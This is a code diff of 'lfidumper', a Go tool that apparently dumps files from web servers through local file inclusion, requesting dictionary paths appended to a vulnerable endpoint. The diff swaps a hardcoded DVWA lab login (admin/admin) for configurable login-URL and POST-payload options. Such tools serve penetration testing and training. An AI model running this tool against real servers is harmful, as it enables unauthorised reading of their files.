@@ -54,16 +54,12 @@ func getFile(endpoint string, file string, outputpath string) {
 
 	// Generate url by joining endpoint & file
 	url := endpoint + file
-	// fmt.Println(url)
 
 	// Create http Request
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		log.Fatalf(err.Error())
 	}
-	// for _, c := range req.Cookies() {
-	// 	fmt.Println(c)
-	// }
 
 	// Send request
 	response, err := client.Do(req)
@@ -132,7 +128,7 @@ func getLineCount(path string) int {
 
 func main() {
 
-	var endpoint, outdir, dictionaryPath, username, password string
+	var endpoint, outdir, dictionaryPath, login, payload string
 	// Parse arguments
 	for i, arg := range os.Args[1:] {
 		if string(arg[0]) == "-" {
@@ -143,10 +139,10 @@ func main() {
 				outdir = os.Args[i+2]
 			case "d": // Dictionary
 				dictionaryPath = os.Args[i+2]
-			case "u": // Username
-				username = os.Args[i+2]
-			case "p": // Password
-				password = os.Args[i+2]
+			case "l": // Login url
+				login = os.Args[i+2]
+			case "p": // Payload
+				payload = os.Args[i+2]
 			case "h": // Help menu
 				print_AsciiArt()
 				fmt.Println()
@@ -155,8 +151,8 @@ func main() {
 				fmt.Println("Options:")
 				fmt.Println("\t -e : Endpoint url. -e 'http://target.com/page='")
 				fmt.Println("\t -o : Output directory. -o output.\n\t      If not specified the output directory will be './out'.")
-				fmt.Println("\t -u : Username")
-				fmt.Println("\t -p : Password")
+				fmt.Println("\t -l : Login url. -l 'http://target/login' ")
+				fmt.Println("\t -p : Login POST payload. -p 'username=admin&password=admin&Login=Login'")
 				fmt.Println("\t -d : Dictionary")
 				fmt.Println("\t -h : Show this menu")
 				fmt.Println()
@@ -170,17 +166,20 @@ func main() {
 	print_AsciiArt()
 
 	if endpoint == "" {
-		fmt.Println("No target url specified. Specify target './lfidumper -e http://target/page='")
+		fmt.Println("No target url specified. Specify target ./lfidumper -e 'http://target/page='")
 		os.Exit(-1)
 	}
 	if dictionaryPath == "" {
 		fmt.Println("No dictionary specified. './lfidumper -d dictionary.txt'")
 		os.Exit(-1)
 	}
-	if username == "" || password == "" {
-		fmt.Println("No credentials specified. Using default credentials")
-		username = "admin"
-		password = "admin"
+	if login == "" && payload != "" {
+		fmt.Println("No Login url specified. Specify target ./lfidumper -l 'http://target/login'")
+		os.Exit(-1)
+	}
+	if login != "" && payload == "" {
+		fmt.Println("No payload specified. Specify payload 'username=admin&password=admin&Login=Login'")
+		os.Exit(-1)
 	}
 	if outdir == "" {
 		outdir = "out"
@@ -195,8 +194,9 @@ func main() {
 	}
 	defer dictionary.Close()
 
-	payload := "username=" + username + "&password=" + password + "&Login=Login"
-	client.Post("http://192.168.1.131/dvwa/login.php", "application/x-www-form-urlencoded", bytes.NewBufferString(payload))
+	if payload != "" {
+		client.Post(login, "application/x-www-form-urlencoded", bytes.NewBufferString(payload))
+	}
 
 	// Read dictionary lines
 	bar := progress.New(0, int64(getLineCount(dictionaryPath)))
@@ -208,6 +208,7 @@ func main() {
 			log.Printf("failed to finish progress: %v", err)
 		}
 	}()
+
 	var line string
 	for {
 		line, err = reader.ReadString('\n') // Read until end of line
